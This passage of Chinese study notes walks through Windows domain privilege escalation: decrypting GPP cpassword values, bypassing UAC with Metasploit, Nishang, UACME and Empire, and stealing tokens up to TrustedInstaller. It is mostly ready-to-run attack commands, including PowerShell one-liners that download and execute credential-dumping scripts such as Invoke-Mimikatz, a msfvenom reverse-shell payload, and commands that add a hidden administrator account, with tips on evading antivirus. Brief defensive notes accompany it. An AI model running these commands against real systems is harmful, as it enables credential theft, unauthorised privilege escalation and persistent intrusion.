<p><mark>管理员在域中新建一个组策略后，系统会自动在 SYSVOL 目录中生成一个 XML 文件（如果配置组策略的过程中输入了密码，密码就会保存在其中）</mark>。该文件中保存了该组策略更新后的密码，该密码使用 AES-256 算法，但 2012 年微软公布了该密码的私钥(<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be">https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be</a>)，也就是说任何人都可以对其进行解密。</p>
<p>常见的组策略首选项(Group Policy Preferences，GPP)列举如下，这些组策略首选项文件中会包含cpassword:</p>
<ul>
<li>映射驱动器（Drives.xml）</li>
<li>创建本地用户（unattend.xml）</li>
<li>数据源（DataSources.xml）</li>
<li>打印机配置（Printers.xml）</li>
<li>创建/更新服务（Services.xml）</li>
<li>计划任务（ScheduledTasks.xml）</li>
<li>更改本地管理员密码</li>
<li>组策略首选项（Groups.xml）</li>
</ul>
<p>由于gpp十分不安全，所以在Windows server 2012及以后的版本中，微软就抛弃了这种方式。</p>
<h3 id="1-查找包含cpassword的XML文件">1.查找包含cpassword的XML文件</h3>
<p>浏览 SYSVOL 文件夹，手动查找包含 cpassword 的 XML 文件</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231110141836942.png" alt="image-20231110141836942"></p>
<p>或者使用 findstr 自动搜索包含 cpassword 的 XML 文件</p>
<pre class="line-numbers language-none"><code class="language-none">findstr &#x2F;s &#x2F;i &quot;cpassword&quot; C:\Windows\SYSVOL\*.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="2-解密cpassword密文">2.解密cpassword密文</h3>
<p>可以使用以下工具和脚本从组策略首选项XML文件中收集和解密密码文件</p>
<ul>
<li><a target="_blank" rel="noopener" href="http://Gpprefdecrypt.py">Gpprefdecrypt.py</a>【Python脚本（仅用于解密）：<a target="_blank" rel="noopener" href="https://github.com/Jici-Zeroten/ScriptWarehouse/blob/main/gpp-encrypt-decrypt/Gpprefdecrypt.py%E3%80%91">https://github.com/Jici-Zeroten/ScriptWarehouse/blob/main/gpp-encrypt-decrypt/Gpprefdecrypt.py】</a></li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">python2.7 Gpprefdecrypt.py Wdkeu1drbxqPJm7YAtPtwBtyzcqO88hJUBDD2eseoY0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>还有一个PowerShell版本的Gpprefdecrypt.ps1【<a target="_blank" rel="noopener" href="https://github.com/Jici-Zeroten/ScriptWarehouse/tree/main/gpp-encrypt-decrypt%E3%80%91">https://github.com/Jici-Zeroten/ScriptWarehouse/tree/main/gpp-encrypt-decrypt】</a></p>
<p>此外，kali中自带的命令<code>gpp-decrypt</code>也可以对其进行解密</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231110152705838.png" alt="image-20231110152705838"></p>
<ul>
<li>Get-GPPPassword.ps1【PowerSploit 项目中提供了 Get-GPPPassword.ps1 脚本。<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1%E3%80%91">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1】</a></li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">#该脚本可在域内主机上执行，能够自动查询共享文件夹\SYSVOL中的文件，还原出所有明文密码
#直接远程下载脚本执行
PowerShell.exe -Exec Bypass -C &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;PowerShellMafia&#x2F;PowerSploit&#x2F;master&#x2F;Exfiltration&#x2F;Get-GPPPassword.ps1&#39;);Get-GPPPassword&quot;
#如果无法下载可以使用 github 代理
PowerShell.exe -Exec Bypass -C &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;ghproxy.com&#x2F;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;PowerShellMafia&#x2F;PowerSploit&#x2F;master&#x2F;Exfiltration&#x2F;Get-GPPPassword.ps1&#39;);Get-GPPPassword&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231110144732018.png" alt="image-20231110144732018"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231110144807994.png" alt="image-20231110144807994"></p>
<pre class="line-numbers language-none"><code class="language-none">#或者下载到本地执行也行
Import-Module .\Get-GPPPassword.ps1
Get-GPPPassword
#如果 PowerShell 由于处在受限模式以至于无法导入脚本，可以使用以下命令绕过。
powershell.exe -exec bypass -command &quot;&amp;&#123;Import-Module .\Get-GPPPassword.ps1;Get-GPPPassword&#125;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>使用MSF</li>
</ul>
<p>MSF也有一个可以自动查找cpassword的后渗透模块，即<code>post/windows/gather/credentials/gpp模块</code></p>
<pre class="line-numbers language-none"><code class="language-none">use post&#x2F;windows&#x2F;gather&#x2F;credentials&#x2F;gpp
set session 1
run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231110151100421.png" alt="image-20231110151100421"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231111182341779.png" alt="image-20231111182341779"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231111182411503.png" alt="image-20231111182411503"></p>
<ul>
<li>使用Empire查找cpassword</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">usemodule privesc&#x2F;gpp
info
execute<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h3 id="组策略首选项提权的防御措施">组策略首选项提权的防御措施</h3>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231110153131764.png" alt="image-20231110153131764"></p>
<h2 id="绕过UAC提权利用-bypassUAC">绕过UAC提权利用(bypassUAC)</h2>
<p>如果计算机的操作系统版本是Windows Vista或更高，在权限不够的情况下，访问系统磁盘的根目录(例如C:\)、Windows目录、Program Files目录，以及读、写系统登录数据库(Registry)的程序等操作，都需要经过UAC(User Account Control，用户账户控制)的认证才能进行。</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231110203622125.png" alt="image-20231110203622125"></p>
<blockquote>
<p>UAC全称User Account Control，存在于Windows Vista及更高的操作系统版本中。UAC 与 UNIX 中的 sudo 工作机制十分相似</p>
</blockquote>
<p>UAC基本介绍：UAC是微软为提高系统安全性在Windows Vista中引入的技术。UAC要求用户在执行可能影响计算机运行的操作或者在进行可能影响其他用户的设置之前，拥有相应的权限或者管理员密码。UAC在操作启动前对用户身份进行验证，以避免恶意软件和间谍软件在未经许可的情况下在计算机上进行安装操作或者对计算机设置进行更改。在Windows Vista及更高版本的操作系统中，微软设置了安全控制策略，分为高、中、低三个等级。高等级的进程有管理员权限；中等级的进程有普通用户权限；低等级的进程，权限是有限的，以保证系统在受到安全威胁时造成的损害最小。</p>
<p>需要UAC的授权才能进行的操作：</p>
<ul>
<li>配置Windows Update</li>
<li>添加/删除用户</li>
<li>更改账户类型</li>
<li>更改UAC的设置</li>
<li>安装ActiveX</li>
<li>安装/卸载程序</li>
<li>安装设备驱动程序</li>
<li>将文件移动/复制到Program Files或Windows目录</li>
<li>查看其他用户的文件夹</li>
</ul>
<p>UAC有四种设置要求：</p>
<ul>
<li>始终通知：这是最严格的设置，每当有程序需要使用高级别的权限时都会提示本地用户。</li>
<li>仅在应用尝试更改我的计算机时通知我：这是UAC的默认设置。当本地Windows要求使用高级别的权限时，不会通知用户。但是，第三方程序要求使用高级别的权限时，会提示本地用户</li>
<li>仅在应用尝试更改计算机时通知我(不降低桌面的亮度)：与上一条设置的要求相同，但是在提示用户时不降低用户的亮度</li>
<li>从不通知：当用户为系统管理员时，所有程序都会以最高权限运行。</li>
</ul>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231110203646357.png" alt="image-20231110203646357"></p>
<h3 id="使用MSF绕过UAC进行提权">使用MSF绕过UAC进行提权</h3>
<p>可绕过UAC的模块：</p>
<ul>
<li><code>exploit/windows/local/bypassuac模块</code>，进行提权时，当前用户必须在管理员组中，且UAC必须为默认设置(即“仅在程序试图更改我的计算机时通知我”)。该模块在windows 32位和64位下都有效</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">msf &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac 
msf exploit(bypassuac) &gt; set session 1 
msf exploit(bypassuac) &gt; run 
meterpreter &gt; getsystem
meterpreter &gt; getuid<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>当bypassuac模块运行时，会在目标机器上创建多个文件，这些文件可能会被杀毒软件识别</p>
<ul>
<li><code>exploit/windows/local/bypassuac_injection模块</code>，会直接运行在内存的反射DLL中，所以不会接触目标机器的硬盘，可以降低被杀软查杀的概念</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_injection
set session 4
run
getsystem
getuid<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li><code>exploit/windows/local/ask模块</code>，会创建一个可执行文件，目标机器会运行一个发起提升权限请求的程序，提示用户是否继续。该模块实际上只是以高权限重启一个返回式shellcode，并没有绕过UAC，会触发系统UAC，受害机器有提示，提示用户是否要运行，如果用户选择“yes”，就可以程序返回一个高权限meterpreter shell</li>
</ul>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231110221222711.png" alt="image-20231110221222711"></p>
<pre class="line-numbers language-none"><code class="language-none">use &#x2F;exploit&#x2F;windows&#x2F;local&#x2F;ask
set session 1
run
#执行run命令之后，会在目标机器上弹出UAC对话框
用户点击“yes”后，会返回一个高权限meterpreter shell
getsystem
getuid<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>要想使用该模块进行提权，当前用户必须在管理员组中，对UAC的设置则没有要求。在使用该模块时，会使用EXE::Custom选项创建一个可执行文件(这个文件最好进行免杀处理，容易被杀软检测)。</p>
<ul>
<li><code>exploit/windows/local/bypassuac_fodhelper模块</code>（通过FodHelper注册表项绕过）</li>
<li><code>exploit/windows/local/bypassuac_eventvwr模块</code>（通过Eventvwr注册表项绕过）</li>
<li><code>exploit/windows/local/bypassuac_comhijack模块</code>（COM处理程序劫持）</li>
<li><code>exploit/windows/local/bypassuac_vbs模块</code></li>
</ul>
<h3 id="使用Nishang中的Invoke-PsUACme模块绕过">使用Nishang中的Invoke-PsUACme模块绕过</h3>
<p>Invoke-PsUACme模块使用来自UACME项目的DLL绕过UAC</p>
<p><mark>影响版本涉及Windows 7/2008/8/2012/Vista X86/64版本。Win 10及以上版本自带的wsua程序由于不再支持/extract参数，故不再适用</mark></p>
<pre class="line-numbers language-none"><code class="language-none">Import-Module .\Invoke-PsUACme.ps1

#使用Sysgrep方法执行默认Payload
Invoke-PsUACme -Verbose
#powershell -nop -exec bypass -c &quot;&amp; &#123;Import-Module .\Invoke-PsUACme.ps1; Invoke-PsUACme -Verbose&#125;&quot;

#使用oobe方法开执行默认的Payload
Invoke-PsUACme -method oobe -Verbose
#powershell -nop -exec bypass -c &quot;&amp; &#123;Import-Module .\Invoke-PsUACme.ps1; Invoke-PsUACme -method oobe -Verbose&#125;&quot;

#默认的payload仅仅检查是否绕过成功
#使用-Payload参数，可以自行指定要执行的Payload
Invoke-PsUACme -method oobe -Payload &quot;powershell -windowstyle hidden -e YourEncodedPayload&quot;
#powershell -nop -exec bypass -c &quot;&amp; &#123;Import-Module .\Invoke-PsUACme.ps1; Invoke-PsUACme -method oobe -Payload &#39;powershell -windowstyle hidden -e YourEncodedPayload&#39;&#125;&quot;
#Invoke-PsUACme -method oobe -Payload &quot;powershell -noexit -c Get-Process&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>-Payload为自定义要执行的程序或代码段</p>
<p>-Verbose显示程序运行过程</p>
<p>-method为bypass的方法，可选的方法有：sysprep、oobe、ActionQueue、migwiz、cliconfg、winsat、mmc</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231111101904325.png" alt="image-20231111101904325"></p>
<p><mark>无论为-Paylaod参数指定了什么，它都会默认在C:\Windows\Temp\cmd.bat中结束</mark>（如果要更改，需要在DLL中改变批处理文件的路径之后，再使用-PayloadPath参数改变它）。此外，使用-CustomDll64或-CustomDLL32参数可以自定义DLL文件</p>
<p>案例演示1：</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231111113756885.png" alt="image-20231111113756885"></p>
<p><mark>默认的payload仅仅检查是否绕过成功</mark></p>
<p>案例演示2：</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231111101035855.png" alt="image-20231111101035855"></p>
<p><mark>Invoke-PsUACme模块并非运行cmd.exe，而是我们告诉DLL从C:\Windows\Temp执行cmd.bat。这个cmd.bat中包含了我们将在目标机器上执行的payload</mark></p>
<p>通过bypass UAC我们可以通过普通的cmd抓到管理员密码</p>
<pre class="line-numbers language-none"><code class="language-none">PS C:\UAC&gt; . .\Invoke-PsUACme.ps1
PS C:\UAC&gt; Invoke-PsUACme -Payload &quot;powershell -noexit IEX (New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;mattifestation&#x2F;PowerSploit&#x2F;master&#x2F;Exfiltration&#x2F;Invoke-Mimikatz.ps1&#39;); Invoke-Mimikatz&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231111114134419.png" alt="image-20231111114134419"></p>
<p>通过bypass UAC让meterpreter获得更高的权限</p>
<pre class="line-numbers language-none"><code class="language-none">#生成payload
sudo msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;x.x.x.x LPORT&#x3D;8889 -f psh-reflection
#将输出文件重命名为psh.ps1，上传到目标机器
#msf开启监听
use exploit&#x2F;multi&#x2F;handler
set payload windows&#x2F;meterpreter&#x2F;reverse_tcp
set lhost x.x.x.xset lport 8889
run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231111114432965.png" alt="image-20231111114432965"></p>
<h3 id="Win10-Bypass-UAC">Win10 Bypass UAC</h3>
<p>Evi1cg师傅修改了一个使用远程注入方式Bypass UAC的powersell脚本以支持Win10</p>
<p>脚本地址：<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/invoke-BypassUAC.ps1">https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/invoke-BypassUAC.ps1</a></p>
<pre class="line-numbers language-none"><code class="language-none">#使用方式与nishang不同，并没有回显
. .\invoke-BypassUAC.ps1
invoke-BypassUAC -Command &#39;net user 1 &quot;Password123!&quot; &#x2F;add&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231111115943460.png" alt="image-20231111115943460"></p>
<p>除了使用Evi1cg师傅的脚本，UACME也很好的支持win10，使用方式如下</p>
<pre class="line-numbers language-none"><code class="language-none">akagi32.exe 1
akagi64.exe 3
#akagi32 1 c:\windows\system32\calc.exe
#akagi64 3 c:\windows\system32\cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>UACME下载地址：<a target="_blank" rel="noopener" href="https://github.com/hfiref0x/UACME">hfiref0x/UACME: Defeating Windows User Account Control (github.com)</a></p>
<h3 id="使用Empire中的模块绕过">使用Empire中的模块绕过</h3>
<p>可绕过UAC的模块：</p>
<ul>
<li>bypassuac模块</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">usemodule privesc&#x2F;bypassuac
#设置监听器参数
set Listeners test
execute
#会得到一个新的反弹shell
agents<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231111125407562.png" alt="image-20231111125407562"></p>
<p>也可以直接找到Empire/data/module_source/privesc路径下的Invoke-BypassUAC.ps1上传到目标靶机上执行</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231111120913454.png" alt="image-20231111120913454"></p>
<pre class="line-numbers language-none"><code class="language-none">Import-Module Invoke-BypassUAC.ps1
Invoke-BypassUAC -Command &#39;net user www$ &quot;qax666@11!&quot; &#x2F;add &amp;&amp; net localgroup administrators www$ &#x2F;add&quot;&#39; -Verbose
或
Invoke-BypassUAC -PayloadPath .\payload.dll -Verbose<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231111122006296.png" alt="image-20231111122006296"></p>
<ul>
<li>bypassuac_wscript模块</li>
</ul>
<p>该模块的大致工作原理是，使用C:\Windows\wscript.exe执行Payload，即绕过UAC，以管理员权限执行Payload。该模块只适用于操作系统为Windows7的机器，尚没有对应的补丁，部分杀毒软件会对该模块的运行进行提示。会话中，带星号的agents就是提权成功的</p>
<pre class="line-numbers language-none"><code class="language-none">usemodule privesc&#x2F;bypassuac_wscript
set Listeners test
execute
agents<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231111125527100.png" alt="image-20231111125527100"></p>
<h3 id="针对绕过UAC提权的防御措施">针对绕过UAC提权的防御措施</h3>
<p>在企业网络环境中，防止绕过 UAC 的最好的方法是不让内网机器的使用者拥有本地管理员权限，从而降低系统遭受攻击的可能性。</p>
<p>在家庭网络环境中，建议使用非管理员权限进行日常办公和娱乐等活动。使用本地管理员权限登录的用户，要将UAC 设置为“始终通知”或者删除该用户的本地管理员权限(这样设置后，会像在WindowsVista 中一样，总是弹出警告)。</p>
<h2 id="令牌窃取">令牌窃取</h2>
<p><mark>令牌（Token）是指系统中的临时密钥，相当于账户和密码</mark>，用于决定是否允许当前请求及判断当前请求是属于哪个用户的。<mark>获得了令牌，就可以在不提供密码或其他凭证的情况下访问网络和系统资源。这些令牌将持续存在于系统中（除非系统重新启动）</mark>。</p>
<p>令牌的最大特点是随机性和不可预测性。一般的攻击者或软件都无法将令牌猜测出来。访问令牌（Access Token）代表访问控制操作主体的系统对象。密保令牌（Security Tolten）也叫作认证令牌或者硬件令牌，是一种用于实现计算机身份校验的物理设备，例如U盾。会话令牌（Session Token）是交互会话中唯一的身份标识符。</p>
<p>伪造令牌攻击的核心是Kerberos协议。Kerberos是一种网络认证协议，其设计目标是通过密钥系统为客户机/服务器应用程序提供强大的认证服务。Kerberos 协议的工作机制如下:</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231111221151384.png" alt="image-20231111221151384"></p>
<p>客户端请求证书的过程如下：</p>
<ol>
<li>客户端向认证服务器发送请求，要求得到证书。</li>
<li>认证服务器收到请求后，将包含客户端密钥的加密证书发送给客户端。该证书包含服务器<br>
Ticket（包含由服务器密钥加密的客户机身份和一份会话密钥）和一个临时加密密钥（又称为会话<br>
密钥，Session Key )。当然，认证服务器也会向服务器发送一份该证书，使服务器能够验证登录的<br>
客户端的身份。</li>
<li>客户端将 Ticket 传送给服务器。如果服务器确认该客户端的身份，就允许它登录服务器。<br>
客户端登录服务器后，攻击者就能通过入侵服务器来窃取客户端的令牌。</li>
</ol>
<h3 id="使用MSF窃取令牌">使用MSF窃取令牌</h3>
<p>假设已经获得了目标机器的 <code>meterpreter Shell</code>。首先输入<code>use incognito</code>命令，然后输入<br>
<code>list_tokens -u</code>命令，列出可用的令牌：</p>
<pre class="line-numbers language-none"><code class="language-none">use incognito或者load incognito
list_tokens -u<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231111151257268.png" alt="image-20231111151257268"></p>
<p>这里看一下令牌的命名，以上面的METASPLOITABLE3\vagrant为例，“METASPLOITABLE3”是目标机器的主机名，“vagrant”是登录的用户名。再比如WIN-57TJ4B561MT\Administrator，&quot;WIN-57TJ4B561MT&quot;是目标机器的主机名，“Administrator”是登录的用户名。所以<mark>令牌的命名是“主机名＼用户名”</mark></p>
<p>Windows有两种类型的令牌：</p>
<ul>
<li><code>Delegation Tokens</code>授权令牌(又称主令牌)，它支持交互式登录（例如，可以通过远程桌面登录及访问）</li>
<li><code>Impersonation Tokens</code>模拟令牌，它支持非交互式的会话。</li>
</ul>
<p><mark>令牌获取的数量取决于获取到 Shell 的权限等级</mark>。</p>
<p><mark>两种token只在系统重启后清除，具有Delegation token的用户在注销后，该Token将变成Impersonation token，依旧有效</mark>。</p>
<p>如果已经获取到了 SYSTEM 权限的令牌，那么攻击者就可以伪造这个令牌，拥有对应的权限。</p>
<pre class="line-numbers language-none"><code class="language-none">impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;
#返回之前token(返回之前的权限)
#rev2self或者drop_token<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231111151901391.png" alt="image-20231111151901391"></p>
<p>可以看到我们已经通过伪造 SYSTEM 的令牌拿到 SYSTEM 权限了。</p>
<p>值得注意的是，如果令牌不加双引号，单斜杠\ 需要改成双斜杠 <code>\\</code> 才行，因为 \ 被当做转义字符处理</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231111152017340.png" alt="image-20231111152017340"></p>
<p>再举个例子，这个例子先使用bypass UAC进行提权，以获得更多令牌</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231111153310093.png" alt="image-20231111153310093"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231111153335054.png" alt="image-20231111153335054"></p>
<p>再举一个有Impersonation Tokens Available的例子，一般是不会直接有Impersonation Tokens Available的，如下</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231111154406357.png" alt="image-20231111154406357"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231111154505309.png" alt="image-20231111154505309"></p>
<p>但是，如果有Impersonation Tokens Available我们就可以窃取或者直接getsystem提权</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231111154550254.png" alt="image-20231111154550254"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231111154310260.png" alt="image-20231111154310260"></p>
<p>如果进程有token，我们也可以使用<code>steal_token pid</code>从进程窃取token</p>
<pre class="line-numbers language-none"><code class="language-none">meterpreter &gt; load incognito
#列举token
meterpreter &gt; list_tokens -u
#token窃取
meterpreter &gt; impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot;

#上面是常规方法，如果进程有token，我们也可以使用steal_token pid窃取token，如下
#列一下进程
meterpreter &gt; ps
#从进程窃取token
meterpreter &gt; steal_token 1252
#返回之前token(返回之前的权限)
meterpreter &gt; rev2self 或 drop_token<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231111174520155.png" alt="image-20231111174520155"></p>
<p>使用这种手法，我们甚至可以获得TI权限</p>
<p>TI (TrustedInstaller)是从Windows Vista开始出现的一个内置安全主体，在Windows中拥有修改系统文件权限，本身是一个服务，以一个账户组的形式出现。它的全名是：<code>NT SERVICE\TrustedInstaller</code>。在前面的用户组介绍中已经提过。因为在Windows系统中即使获得了管理员权限和system权限，也不能修改系统文件，所以我们需要更进一步获得TI (TrustedInstaller)权限</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231111181245596.png" alt="image-20231111181245596"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231111182127179.png" alt="image-20231111182127179"></p>
<p>我们使用MSF通过incognito获得TI权限，流程为：启动服务<code>TrustedInstaller.exe</code>，然后利用<code>incognito</code>获取<code>TrustedInstaller.exe</code>的Token，具体如下</p>
<pre class="line-numbers language-none"><code class="language-none">sc.exe start Trustedinstaller<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231111181557908.png" alt="image-20231111181557908"></p>
<p>回到Meterpreter</p>
<pre class="line-numbers language-none"><code class="language-none">meterpreter &gt; ps<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231111181635991.png" alt="image-20231111181635991"></p>
<p>找到<code>TrustedInstaller.exe</code>的PID，窃取他的Token</p>
<pre class="line-numbers language-none"><code class="language-none">meterpreter &gt; load incognito
meterpreter &gt; steal_token 1772
meterpreter &gt; getuid<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>窃取成功</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231111182052699.png" alt="image-20231111182052699"></p>
<p>虽然UID相同，但是可以写入<code>C:\Windows\servicing</code>，权限已经是TrustedInstaller，证明我们提权已经成功</p>
